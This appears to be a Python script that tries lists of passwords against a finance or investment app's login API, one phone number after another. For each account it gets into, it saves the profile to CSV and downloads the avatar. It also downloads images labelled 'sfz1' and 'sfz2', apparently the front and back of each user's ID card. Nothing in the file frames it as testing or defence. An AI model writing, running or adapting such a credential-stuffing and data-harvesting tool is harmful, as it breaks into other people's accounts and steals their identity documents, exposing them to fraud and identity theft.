import re
from library import UserDataSaver, get_config, ApiClient, parse_phone

def download_boss(login_list, trying_passwords, country_code_to_test, boss_or_lay):
    for password in trying_passwords:
        saving_folder = UserDataSaver(f"{boss_or_lay}/{password}")
        for phone in login_list[:]:
            parsed_country_code, phone_num = parse_phone.parse_phone(phone)
            full_phone = f"{country_code_to_test}-{phone_num}"
            cfg = get_config(country_code_to_test)
            with ApiClient(cfg) as client:
                try:
                    print(f"working on {phone_num} with <{password}>" )
                    token = client.login(phone_num, password)
                    if token is not None:
                        json = client.get_single_json(cfg.USER_INFO_URL, token=token)
                        saving_folder.save_user_csv(full_phone, json.get("row"), "user_info")
                        saving_folder.download_option_picture(json.get("row"), "avatar", full_phone)
                        json = client.get_single_json(cfg.AUTH_CHECK_URL, token=token)
                        if json.get("row"):
                            saving_folder.save_user_csv(full_phone, json.get("row"), "Invest_Auth")
                            saving_folder.download_option_picture(json.get("row"), "sfz1", full_phone)
                            saving_folder.download_option_picture(json.get("row"), "sfz2", full_phone)
                    login_list.remove(phone)

                except AssertionError as e:
                    pass